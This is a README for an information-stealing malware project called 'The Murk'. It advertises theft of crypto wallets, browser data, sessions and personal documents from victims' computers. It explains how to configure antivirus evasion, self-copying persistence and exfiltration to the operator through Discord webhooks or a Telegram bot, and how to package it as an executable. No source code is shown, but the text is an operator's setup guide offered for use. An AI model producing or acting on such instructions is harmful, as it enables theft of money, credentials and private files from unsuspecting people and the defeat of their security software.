### 🔐 About this repository

Powerful multi-platform stealer with a huge pack of grabbed data. Wallets stealer, browsers stealer, sessions stealer, etc. All logs will be sent using discord webhooks or telegram bot.

## 🔨Building(manually)

### Configuring

Download the source code. Then go to `The Murk\preferences` dir and rename `defaultConfig.py` to `config.py` and open it in any text editor. There you'll see some vars, here is an explanation of them:

> * `enableFileGrabber`
> 
> If you set this var as `True`, all files with extensions `.txt; .docx; .csv; .xls; .png; .jpg` will be collected from the computer and sent to you
> 
> * `oneStart`
> 
> If you set this var as `True`, the application will be able to run only once on the same pc
> 
> * `id`
> 
> write here any integer, this var'll be used to check oneStart
>
> * `avbypass`
> 
> If you set this var as `True`, the application will automatically add itself to the whitelist of AV and make a copy of itself in case of deleting
>
> * `pathToLogs`
> 
>the path that will be stored logs before sending, the path from user dir. Should start with `\\` and `\\` should be between dirs names

### Now let's figure out how to fill out the fields of `sendData`.

**For Discord(same for builder)**

So firstly, create your Discord server and webhook there. [How to do it](https://hookdeck.com/webhooks/platforms/how-to-get-started-with-discord-webhooks). Then, insert the webhook link in a separate field as in example `[0, "url of your WebHook", "null"]`.

**For Telegram(same for builder)**

So firstly, go to the [@BotFather](https://t.me/BotFather) bot and create your own bot, copy HTTP API of bot. Now you need to get your chat id. To do this, go to the next bot [@ShowJsonBot](https://t.me/ShowJsonBot) and copy the id too. Then, insert the HTTP API and the id in separate fields as in example `[1, "HTTP API", "chat ID"]`, don't forget to change the first var from 0 to 1.

You can comment out any function you don't need in `progress.py`

### Packing

Install required packages and run `pack.bat`. The executable will be in `dist`. I recommended using a virtual enviorment instead of just install and pack it directly.
